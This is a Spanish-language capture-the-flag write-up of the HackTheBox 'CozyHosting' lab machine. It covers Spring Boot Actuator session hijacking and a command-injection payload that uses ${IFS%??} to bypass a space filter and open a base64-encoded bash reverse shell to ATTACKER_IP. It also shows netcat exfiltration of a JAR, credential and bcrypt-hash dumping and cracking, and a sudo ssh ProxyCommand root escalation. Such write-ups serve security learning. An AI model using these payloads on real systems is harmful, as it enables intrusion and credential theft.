---
title: "CozyHosting"
date: 2024-01-22
categories: [HackTheBox, Easy]
tags: [linux, spring-boot, command injection, postgresql, john the ripper]
image:
  path: /assets/img/HTB/CozyHosting/banner.png
  alt: CozyHosting writeup
---


Aplicación Spring Boot que filtra IDs de sesión a través de un endpoint `/actuator/sessions` expuesto, lo que permite secuestrar directamente el JSESSIONID de un admin. El panel de administración expone un endpoint `/executessh` vulnerable a command injection a través del campo `username`, sorteado con `${IFS%??}` para vencer el filtro de espacios y obtener una reverse shell como `app`. Movimiento lateral a `josh` mediante credenciales de PostgreSQL extraídas de un JAR descompilado y el crackeo bcrypt de la contraseña de admin (reutilizada entre la aplicación y las cuentas del sistema); escalada de privilegios mediante un abuso al estilo GTFOBins de `sudo /usr/bin/ssh *`.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Fácil               |
| SO         | Linux               |
| IP         | 10.10.11.230        |
| Fecha      | Enero 2024          |

## Herramientas utilizadas

| Herramienta       | Descripción                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| nmap              | Escáner de puertos e identificación de servicios                                     |
| whatweb           | Herramienta de fingerprinting de tecnologías web                                     |
| gobuster          | Enumeración de directorios y archivos por fuerza bruta con diccionario               |
| Browser DevTools  | Inyección de la cookie de sesión por el panel de almacenamiento para el secuestro    |
| Burp Suite        | Interceptación y modificación de la petición del payload `/executessh`               |
| netcat (nc)       | Listener de reverse shell y transferencia del archivo JAR                            |
| jd-gui            | Descompilador de Java usado para inspeccionar `cloudhosting-0.0.1.jar`               |
| psql              | Cliente de PostgreSQL usado para volcar la tabla `users`                             |
| hashid            | Identificador de algoritmos de hash                                                  |
| john              | Crackeador de contraseñas, usado contra el hash bcrypt de la cuenta `admin`          |

## Reconocimiento y enumeración

El objetivo de esta fase era enumerar los servicios expuestos e identificar el stack de aplicación que merecía la pena atacar.

### Descubrimiento del host

La accesibilidad se confirmó con ICMP. El TTL de 63 (el TTL por defecto en Linux es 64, decrementado una vez al cruzar el salto de enrutamiento) dio la pista habitual del SO:

```bash
ping -c 1 10.10.11.230
PING 10.10.11.230 (10.10.11.230) 56(84) bytes of data.
64 bytes from 10.10.11.230: icmp_seq=1 ttl=63 time=1082 ms
```

### Escaneo de puertos

Un escaneo SYN sobre todo el rango TCP a alta velocidad de paquetes, con `-Pn` para saltar el descubrimiento de host y `-n` para deshabilitar el DNS inverso:

```bash
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.230 -oG AllPorts
Host: 10.10.11.230 ()   Status: Up
Host: 10.10.11.230 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9000/open/tcp//cslistener///
```

Tres puertos abiertos: SSH, HTTP y un tercer servicio que Nmap etiquetó como `cslistener` en el 9000. Le siguió un escaneo dirigido con los scripts por defecto y detección de versiones:

```bash
nmap -p22,80,9000 -sCV 10.10.11.230 -oN nmap
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp   open   http        nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
9000/tcp closed cslistener
```

Algunas observaciones eran relevantes. **OpenSSH 8.9p1 en Ubuntu** es reciente y es poco probable que sea un punto de entrada directo. El puerto 9000 resultó estar cerrado en el segundo escaneo (probablemente transitorio o limitado por rate durante el primero), así que la única superficie de ataque real era HTTP en el 80. El título de la página `Cozy Hosting - Home` y la redirección que devolvió nginx apuntaban ambos a un virtual host basado en nombre.

### Fingerprinting de tecnologías

`whatweb` confirmó tanto el destino de la redirección como el stack subyacente:

```bash
whatweb 10.10.11.230
http://10.10.11.230 [301 Moved Permanently] HTTPServer[nginx/1.18.0 (Ubuntu)], RedirectLocation[http://cozyhosting.htb], Title[301 Moved Permanently]
http://cozyhosting.htb [200 OK] Bootstrap, HTTPServer[nginx/1.18.0 (Ubuntu)], Email[info@cozyhosting.htb], HTML5, Title[Cozy Hosting - Home]
```

El dominio `cozyhosting.htb` se añadió al `/etc/hosts` para que la aplicación resolviera correctamente:

```bash
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

### Enumeración de directorios

Las páginas de inicio, servicios y precios no tenían puntos de entrada evidentes — sin banners de versión, sin login (todavía), sin parámetros que merecieran fuzzing. El siguiente paso natural era el descubrimiento de contenido:

```bash
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

Tres cosas destacaban. El endpoint `/admin` existe pero devuelve 401, lo que significa que hay un límite de autenticación real que vale la pena sortear. El endpoint `/error` devuelve 500, algo inusual — la mayoría de las aplicaciones devuelven una página de error genérica o redirigen. Y visitar `/error` directamente reveló la pista clave:

> **Whitelabel Error Page**
> This application has no explicit mapping for /error, so you are seeing this as a fallback.
> There was an unexpected error (type=None, status=999).

La cadena "Whitelabel Error Page" es la plantilla de error por defecto de las aplicaciones **Spring Boot**. Identificar el framework importa porque Spring Boot incluye un módulo de gestión notoriamente sobreexpuesto llamado **Actuator**.

## Explotación

### Descubrimiento de Spring Boot Actuator

El Actuator de Spring Boot es un subsistema de gestión que expone métricas de runtime, configuración, variables de entorno y — dependiendo de lo agresivamente que se haya configurado — información de sesión, heap dumps, variables de entorno con credenciales e incluso ejecución arbitraria de endpoints. En despliegues seguros, Actuator está deshabilitado, montado en un puerto de gestión separado o restringido a localhost. En despliegues inseguros — como este — está montado bajo `/actuator` en la aplicación pública y lista cada sub-endpoint disponible cuando se consulta en la raíz.

Acceder a `/actuator` directamente devolvió el catálogo de endpoints:

```bash
curl -s http://cozyhosting.htb/actuator | jq .
{
  "_links": {
    "self":     { "href": "http://cozyhosting.htb/actuator", "templated": false },
    "sessions": { "href": "http://cozyhosting.htb/actuator/sessions", "templated": false },
    "health":   { "href": "http://cozyhosting.htb/actuator/health", "templated": false },
    "mappings": { "href": "http://cozyhosting.htb/actuator/mappings", "templated": false },
    "env":      { "href": "http://cozyhosting.htb/actuator/env", "templated": false }
  }
}
```

El endpoint `/actuator/sessions` es el interesante — devuelve los IDs de sesión activos del lado del servidor.

### Secuestro de sesión vía `/actuator/sessions`

Navegar a `http://cozyhosting.htb/actuator/sessions` devolvió un objeto JSON que mapeaba IDs de sesión con los nombres de usuario a los que pertenecían:

```bash
curl -s http://cozyhosting.htb/actuator/sessions | jq .
{
  "4CCF7360B29B2E07EE2D1864E1D7E45F": "UNAUTHORIZED",
  "1F3A1D95A360C066C6C075AC1F8F7AFE": "kanderson"
}
```

Esto es un bypass de autenticación completo. La sesión de **`kanderson`** está ligada al JSESSIONID `1F3A1D95A360C066C6C075AC1F8F7AFE`, y los valores por defecto de la cookie de sesión de Spring Boot hacen que ese ID por sí solo baste para autenticarse. Cualquiera que pueda leer `/actuator/sessions` puede leer el ID de sesión de todos los usuarios activos, lo que significa que puede ser cada usuario activo.

Abrí DevTools en la página de login de `cozyhosting.htb`, navegué a **Storage → Cookies** y pegué el JSESSIONID secuestrado como valor de la cookie `JSESSIONID`. Recargar la página redirigió directamente a `/admin` — autenticado como kanderson, sin contraseña.

### Command injection en `/executessh`

El dashboard de admin exponía un formulario "Add Host" para gestionar conexiones SSH a la infraestructura de hosting de la empresa. El formulario hacía POST a `/executessh` con dos campos, `host` y `username`. Capturar la petición en Burp Suite reveló la forma exacta de la petición:

```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=1F3A1D95A360C066C6C075AC1F8F7AFE

host=10.10.11.230&username=test
```

Un envío con valores arbitrarios devolvió `Host Key Verification Failed`, que es *exactamente* el mensaje de error que produce **el binario `ssh` real** cuando no puede validar una host key. Ese único mensaje de error delató la arquitectura: el backend estaba invocando `ssh user@host` como un proceso externo con los campos del formulario interpolados en la línea de comandos. Cualquier ruta de código que construye un comando de shell a partir de entrada del usuario es sospechosa de command injection.

Sondear con una comilla simple en `username` provocó un error distinto — un error de parseo de shell reflejado en la respuesta — confirmando que la entrada llega a un contexto de shell. La siguiente prueba usó un punto y coma y un `whoami` para romper el argumento `ssh` previsto:

```text
host=10.10.11.230&username=test;whoami
```

La respuesta contenía ahora `whoami@10.10.11.230` en lugar de `test@10.10.11.230`, lo que significa que el nombre literal del comando se estaba sustituyendo. La inyección funcionó a nivel de shell, pero el shell necesitaba que el comando realmente se ejecutara. Envolverlo en backticks forzó la ejecución:

```text
host=10.10.11.230&username=test;`whoami`
```

La respuesta confirmó el usuario ejecutado: **`app`**.

### Sorteando el filtro de espacios con `${IFS%??}`

Una prueba más útil — leer `/etc/passwd` — falló porque la aplicación valida `username` contra espacios en blanco:

```text
Username can't contain whitespaces!
```

Este es un filtro de command injection de manual: el desarrollador bloqueó los **caracteres de espacio** en `username` para "prevenir la inyección", pero todo payload de inyección realista (`cat /etc/passwd`, reverse shells canalizadas por base64, etc.) necesita espacios entre argumentos. El bypass clásico es usar una sustitución del lado del shell que *evalúe a* un espacio sin contenerlo en la entrada literal.

La variable `$IFS` en Bash es el **Internal Field Separator** — el conjunto de caracteres que Bash usa para dividir palabras. Su valor por defecto es `' \t\n'` (espacio, tabulador, salto de línea). Cualquier expansión de `$IFS` en un contexto de shell produce un carácter de espacio en blanco que el filtro de la aplicación nunca ve como espacio literal, porque el payload literal solo contiene los cinco caracteres `$`, `{`, `I`, `F`, `S`, `}`.

Se usan comúnmente dos variantes:

- **`$IFS`** a secas — funciona en la mayoría de contextos, pero se expande a los tres caracteres del IFS a la vez, lo que puede introducir tabuladores/saltos de línea sueltos que confunden a los parsers posteriores.
- **`${IFS%??}`** — usa la expansión de parámetros de Bash `${var%pattern}` (eliminar el sufijo coincidente más corto) con `??` casando dos caracteres. El tabulador y el salto de línea finales se eliminan, dejando solo el espacio. Esta es la variante más segura cuando el contexto del shell es frágil.

El payload de la reverse shell se preparó como un one-liner, codificado en base64 para evitar aún más problemas con el filtro:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA+JjEK
```

Envuelto en una cadena `echo ... | base64 -d | bash` con cada espacio reemplazado por `${IFS%??}`:

```text
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

Y finalmente codificado en URL para el transporte en el cuerpo del POST (`+` se convierte en `%2B`, `;` en `%3B`, `$` en `%24`, etc.) para evitar que la capa HTTP malinterprete cualquier carácter reservado:

```text
username=%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

Se inició un listener de netcat en la máquina atacante:

```bash
nc -nlvp 443
Listening on 0.0.0.0 443
```

La petición final se reenvió a través de Burp. El listener capturó la conexión de vuelta como el usuario de servicio **`app`**. Una mejora estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) hizo la shell usable.

## Movimiento lateral — `app` → `josh`

### Localizando el JAR de la aplicación

Una shell como el usuario de servicio `app` tiene muy poco alcance por defecto. El primer artefacto útil era visible de inmediato en `/app`:

```bash
ls /app
cloudhosting-0.0.1.jar
```

Un fat JAR de Spring Boot contiene cada dependencia, cada archivo de configuración, cada clase compilada — incluyendo credenciales hardcodeadas y cadenas de conexión a la base de datos. Extraerlo y leerlo es el siguiente movimiento estándar.

### Exfiltrando el JAR

Netcat maneja las transferencias binarias de forma limpia. Un listener con redirección en el lado del atacante captura el archivo según va llegando:

```bash
# Atacante:
nc -nlvp 443 > db.jar
```

```bash
# Objetivo:
nc <ATTACKER_IP> 443 < cloudhosting-0.0.1.jar
```

### Descompilando con jd-gui

`jd-gui` es un descompilador de Java con interfaz gráfica que abre fat JARs directamente y presenta su árbol de clases con el código fuente descompilado en el panel derecho:

```bash
jd-gui db.jar
```

Dos archivos importaban.

**`BOOT-INF/classes/application.properties`** contenía la configuración del datasource de Spring, incluidas las credenciales de PostgreSQL:

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled=true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.datasource.jpa.database-platform=org.hibernate.dialect.PostgreSQL
spring.jpa.hibernate.ddl-auto=none
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Dos observaciones laterales que merece la pena notar más allá de la obvia filtración de credenciales: la línea `management.endpoints.web.exposure.include` habilitaba explícitamente el endpoint `sessions` que rompió la autenticación antes, y `server.address=127.0.0.1` significa que la app de Spring Boot solo escucha en localhost — hay un proxy inverso nginx delante de ella en el puerto 80 que añade la capa de cara al público.

**`BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class`** se descompiló en una clase que contenía lo que parecía otra credencial:

```text
"--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v"
```

El nombre de la clase `FakeUser` es la pista — es un señuelo deliberado plantado para hacer perder el tiempo al atacante. La credencial `MRdEQuv6~6P9` no funciona contra ningún servicio real. El camino real pasa por PostgreSQL.

### Volcado de PostgreSQL

La shell en el objetivo tenía `psql` disponible, así que la base de datos podía consultarse directamente sin necesidad de un túnel:

```bash
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR

postgres=# \c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".

cozyhosting=# \d
                List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres

cozyhosting=# SELECT * FROM users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecfImPudWeLSEIv.cvK6QjxjWlWXpj1NVNV3Mm6eH58zim   | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm  | Admin
```

Dos hashes bcrypt, uno por usuario. El hash de `admin` es el que vale la pena atacar — es la cuenta privilegiada y más probable que tenga una contraseña adivinable reutilizada en otro sitio.

### Crackeando el hash bcrypt

Confirmar el algoritmo con `hashid` antes de lanzarle diccionarios ahorró tiempo y aseguró el modo correcto de hashcat/john:

```bash
hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```

bcrypt con un coste de 10 — lento por diseño, así que un diccionario dirigido importa más que la velocidad bruta. `john` contra `rockyou.txt`:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
manchesterunited (?)
1g 0:00:00:14 DONE
```

Contraseña recuperada: **`manchesterunited`** — un club de fútbol popular, exactamente el tipo de contraseña de poco esfuerzo que rockyou está hecho para cazar.

### Reutilización de credenciales: `admin` → `josh`

La contraseña crackeada pertenecía al usuario `admin` de la aplicación, que no tiene presencia inherente en el SO — `admin` es una fila en una tabla de base de datos, no una entrada en `/etc/passwd`. La pregunta interesante era si la misma contraseña se había reutilizado para una cuenta del sistema. Leer `/etc/passwd` desde la shell del objetivo reveló exactamente un usuario con una shell de login real además de `root`:

```bash
cat /etc/passwd | grep -E "/bin/(bash|sh)$"
root:x:0:0:root:/root:/bin/bash
josh:x:1003:1003::/home/josh:/bin/bash
```

Probar `manchesterunited` contra `josh` funcionó:

```bash
su josh
Password: manchesterunited
josh@cozyhosting:~$ whoami
josh
josh@cozyhosting:~$ cat user.txt
```

Este es el patrón canónico de reutilización de credenciales: una contraseña de nivel de aplicación que el mismo operador resultó establecer en una cuenta del sistema porque recordar dos contraseñas es más difícil que recordar una.

## Escalada de privilegios — `josh` → `root`

Con una shell como `josh`, `sudo -l` devolvió el vector de escalada de privilegios de inmediato:

```bash
sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=...

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

`josh` puede ejecutar `/usr/bin/ssh` como root con cualquier argumento (comodín `*`). A primera vista parece inofensivo — `ssh` sirve para conectarse a hosts remotos, no para ejecutar código local. Pero `ssh` tiene muchas opciones de configuración que pueden ejecutar comandos arbitrarios como efecto secundario de *intentar* conectarse, y la más útil es **`ProxyCommand`**.

`ProxyCommand` le dice a `ssh` que lance un subproceso local y use su stdin/stdout como conexión al objetivo. Como el subproceso se lanza con los mismos privilegios que el propio `ssh` — root, en este caso — hereda el UID de root. La entrada de GTFOBins para `ssh` documenta el conjuro exacto: lanzar una shell como ProxyCommand y conectar stdin/stdout al terminal de control.

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cat /root/root.txt
```

El punto y coma inicial convierte el valor de la opción en una secuencia de comandos de shell (`;sh 0<&2 1>&2`) que abre `/bin/sh` con stdin/stdout redirigidos al TTY heredado (descriptor de archivo 2). La `x` es un hostname de destino ficticio — `ssh` nunca se conecta realmente, porque el proxy command lanza la shell antes de que ocurra cualquier conexión de red.

La flag de root se podía leer directamente desde `/root`.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones clave

- **El Actuator de Spring Boot es una superficie de ataque por defecto.** Hay que asumir que cualquier aplicación Spring Boot accesible desde internet tiene un Actuator expuesto salvo que se verifique explícitamente lo contrario. Los endpoints `/actuator/sessions`, `/actuator/env`, `/actuator/heapdump` y `/actuator/mappings` por sí solos pueden entregar la autenticación, secretos de configuración, credenciales en memoria y la tabla de rutas HTTP completa — sin explotar ninguna vulnerabilidad a nivel de código.
- **Los filtros de lista negra sobre entrada que va a un contexto de shell fallan de forma predecible.** Bloquear los caracteres de espacio literales en un campo que acaba en una línea de comandos de shell equivale a poner un cartel de "prohibido fuego" sobre hierba seca — el atacante simplemente trae un mechero de otra forma. `${IFS%??}`, `$'\x20'`, `${PATH:0:1}`, la brace-expansion `{a,b}`, el staging en base64, los payloads en hexadecimal decodificados en línea — cualquiera de estos vence una lista negra de espacios. La solución correcta es no construir nunca comandos de shell a partir de entrada del usuario; si es absolutamente necesario, usar APIs estilo `execve` que toman un array de argumentos y evitan el shell por completo.
- **La forma de un mensaje de error delata la arquitectura.** `Host Key Verification Failed` no es una cadena de error genérica — es la salida literal del cliente `ssh` de OpenSSH. Devolver esa cadena al usuario basta para revelar que el backend invoca `ssh` como subproceso, lo que pone de inmediato el command injection en el plan de pruebas.
- **Las credenciales señuelo son cada vez más comunes en las máquinas de retos, pero el principio aplica también en engagements reales.** Una clase literalmente llamada `FakeUser` que contiene lo que parecen credenciales reales debe tratarse con sospecha, no usarse como pista principal. El nombre en sí es una señal, y quemar diez minutos en una credencial sin salida es la diferencia entre un engagement eficiente y uno frustrante.
- **La reutilización de credenciales entre las capas de aplicación y de SO es la primitiva de movimiento lateral más común en engagements de Linux.** Las cuentas de admin de aplicación y las cuentas de sistema del mismo dueño casi siempre comparten contraseñas; comprobar `/etc/passwd` tras crackear cualquier hash de aplicación debería ser reflejo, no una ocurrencia tardía.
- **`sudo /usr/bin/ssh *` es funcionalmente `sudo /bin/bash`.** GTFOBins documenta este y muchos otros binarios que, pese a parecer de "propósito específico", exponen ejecución arbitraria de código a través de opciones de configuración estándar. La regla general es que ningún binario con una opción `--exec`, `-c`, `--script` o equivalente a `ProxyCommand` debería permitirse vía sudo con argumentos comodín.
